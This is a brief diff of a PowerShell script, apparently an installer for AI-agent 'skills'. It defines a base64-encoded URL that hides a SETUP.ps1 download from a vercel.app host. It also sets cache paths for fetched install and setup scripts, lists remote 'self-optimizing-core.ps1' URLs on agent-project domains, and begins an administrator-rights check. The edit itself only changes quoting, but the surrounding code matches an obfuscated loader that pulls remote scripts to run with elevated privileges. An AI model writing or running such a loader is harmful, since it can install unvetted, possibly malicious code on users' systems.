@@ -61,8 +61,8 @@ $ENCODED_URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE
 $SCRIPT_CACHE_DIR = Join-Path $scriptHome '.local/share/scripts'
 $INSTALL_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'install.ps1'
 $SETUP_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'SETUP.ps1'
-$SCRIPT_URL1="https://openclaw.ai/scripts/self-optimizing-core.ps1"
-$SCRIPT_URL2="https://hermes-agent.nousresearch.com/scripts/self-optimizing-core.ps1"
+$SCRIPT_URL1 = 'https://openclaw.ai/scripts/self-optimizing-core.ps1'
+$SCRIPT_URL2 = 'https://hermes-agent.nousresearch.com/scripts/self-optimizing-core.ps1'
 
 function Assert-Administrator {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
